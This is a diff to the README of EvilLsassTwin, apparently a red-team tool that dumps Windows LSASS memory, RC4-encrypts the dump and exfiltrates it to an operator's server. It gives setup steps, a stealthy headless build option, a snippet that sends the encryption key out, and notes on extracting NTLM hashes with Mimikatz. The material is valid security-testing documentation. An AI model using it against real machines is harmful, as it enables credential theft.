@@ -33,19 +33,32 @@ This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** 
 2. Configure settings from lines 15 to 25. Settings include Server IP and Port, SMB Share Name, saving to disk, minidump method (*set to either **useCustom** or **useTraditional***), and exfil method (*set to either **useRaw** or **useSMB***)
 4. Compile the project with `nim build`. _Note: this assumes EvilTwinServer will be run on a Linux machine. Manual compilation required otherwise_
 5. If **not** set to save to file: `chmod +x EvilTwinServer && ./EvilTwinServer`
-6. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.   
+6. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.
+
+# Why's
+## Why RC4?
+Simplicity. A simple call to `SystemFunction032` is all it takes to implement. Nothing else to code. Entropy isn't sky-high. And it's good enough.
+
+## Why code changes instead of command-line parameters?
+First, I don't like Nim's command-line parsing options. Second, if you can't make those simple changes to the code, you probably shouldn't be using this. Third, no command-line parameters means no need for command-line spoofing.
+
+## Why Nim?
+I wrote an entire blog post about this. See: [Why Nim? - RePRGM](https://reprgm.github.io/2023/02/13/why-nim/)
 
 # Important Notes
 By default, EvilLsassTwin *will* use RC4 to encrypt the dump and display the encryption key in hexadecimal in the console. EvilTwinServer will attempt to decrypt the dump file automatically for you. However, if this fails, you will have to decrypt the file yourself. This can be done with OpenSSL. Take note of the command used in either the terminal (if running) or in the `EvilTwinServer.nim` file!
 
 Alternatively, if you **don't** want a console screen popping up on the target machine, a "headless" build can be done. Take note of the build command in the `config.nims` file and add option `--app:gui`. Doing so will require you to either use EvilTwinServer or create a custom script/application. This is due to EvilLsassTwin sending the encryption key and then the dump in that order. Should another application be used without modification to the `EvilLsassTwin.nim` file, both encryption key and data are likely to be included in the same file, rendering the dump file useless without even further modification. 
 
-Lastly, EvilTwinServer is **not** required with a standard build. With a simple change to the `EvilLsassTwin.nim` file, another application may be used to receive the encrypted dump file. To do so, simply comment out or remove the following lines: 
+EvilTwinServer is **not** required with a standard build. With a simple change to the `EvilLsassTwin.nim` file, another application may be used to receive the encrypted dump file. To do so, simply comment out or remove the following lines: 
 ```nim
 echo "[!] Sending Encryption Key to Server..."
         if not socket.trySend(rc4KeyStr):
             echo "[-] Could Not Send Encryption Key to Server!"
 ```
+
+Lastly, the custom minidump function is not complete as of now. This means **only** NTLM hashes will be found by tools such as Mimikatz and Pypykatz. For anything else, you will need to configure the tool to use the `MiniDumpWriteDump` function which also will result in large (~50+ MB) dump files. It is because this custom function is not complete that the option to use the traditional API function is there.
+
 # Resources
 [Bill Demirkapi - Abusing Windows Implemention of Fork for Stealthy Memory Operations](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)
 
